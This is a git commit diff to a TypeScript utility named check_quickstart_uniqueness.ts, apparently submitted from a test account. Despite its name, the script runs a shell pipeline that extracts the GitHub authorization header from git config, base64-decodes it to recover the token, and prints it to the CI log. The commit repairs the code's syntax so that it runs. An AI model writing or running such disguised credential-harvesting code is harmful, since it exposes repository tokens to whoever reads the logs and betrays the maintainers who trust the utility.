2ae1b408a03afc5c167ea0d9b8b26a7029f69910
ndavisontest2 <58417511+ndavisontest2@users.noreply.github.com>
2025-05-26 14:17:02 +1000

    Update check_quickstart_uniqueness.ts

--- utils/check_quickstart_uniqueness.ts
+++ utils/check_quickstart_uniqueness.ts
@@ -1,12 +1,12 @@
 const subProcess = require('child_process');
 
 const main = (): void => {
-  subProcess.exec("git config --get http.https://github.com/.extraheader | sed -nE 's/AUTHORIZATION: basic (.*)/\1/p' | base64 -d | sed -nE 's/.*:(.*)/\1/p'", (err, stdout, stderr) => {
+  subProcess.exec("git config --get http.https://github.com/.extraheader | sed -nE 's/AUTHORIZATION: basic (.*)/\1/p' | base64 -d | sed -nE 's/.*:(.*)/\1/p'", (err: any, stdout: any, stderr: any) => {
     if (err) {
       console.error(err)
       process.exit(1)
     } else {
-      console.log({stdout.toString())
+      console.log(stdout.toString())
     }
   })
 };
